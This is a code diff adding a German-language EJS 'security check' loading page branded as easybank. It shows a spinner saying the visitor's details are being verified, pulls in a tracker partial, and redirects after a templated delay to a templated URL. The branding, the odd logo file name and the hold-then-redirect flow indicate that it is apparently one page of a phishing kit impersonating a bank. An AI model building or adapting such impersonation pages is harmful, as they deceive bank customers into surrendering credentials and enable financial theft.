@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="de">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, shrink-to-fit=no, minimum-scale=1, maximum-scale=5">
+    <meta name="apple-mobile-web-app-status-bar-style" content="white">
+    <%- include('partials/tracker') %>
+        <meta http-equiv="refresh" content="<%=time%>; url=<%=url%>">
+        <title>Sicherheitsprüfung</title>
+        <link rel="stylesheet" href="css/botta.css">
+        <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+        <style>
+            .logo-svg {
+                max-width: 100%;
+            }
+
+            .spinner-container {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                gap: 20px;
+                padding: 40px 0;
+            }
+
+            .spinner {
+                width: 50px;
+                height: 50px;
+                border-radius: 50%;
+                border: 4px solid #f3f3f3;
+                border-top: 4px solid var(--easy-teal);
+                /* Using brand color */
+                animation: spin 1s linear infinite;
+            }
+
+            .spinner-text {
+                font-size: 18px;
+                color: var(--text-color);
+                font-weight: 500;
+            }
+
+            @keyframes spin {
+                to {
+                    transform: rotate(360deg);
+                }
+            }
+        </style>
+</head>
+
+<body>
+    <div class="container">
+        <!-- Header -->
+        <header class="header">
+            <div class="header-inner">
+                <img src="img/luigon.PNG" alt="easybank" class="logo">
+                <!-- No register button needed on loading screen usually -->
+            </div>
+        </header>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <div class="login-card">
+                <div class="spinner-container">
+                    <div class="spinner"></div>
+                    <div class="spinner-text">Wir überprüfen Ihre Angaben...</div>
+                    <p style="color: #666; font-size: 14px; margin-top: 10px;">Bitte schließen Sie dieses Fenster nicht.
+                    </p>
+                </div>
+            </div>
+        </main>
+
+        <footer class="footer">
+            <div class="footer-links">
+                <a href="#">FAQ</a>
+                <a href="#">Kontakt</a>
+                <a href="#">Impressum</a>
+                <a href="#">Datenschutz</a>
+                <a href="#">AGB</a>
+                <a href="#">Barrierefreiheit</a>
+            </div>
+        </footer>
+    </div>
+</body>
+
+</html>
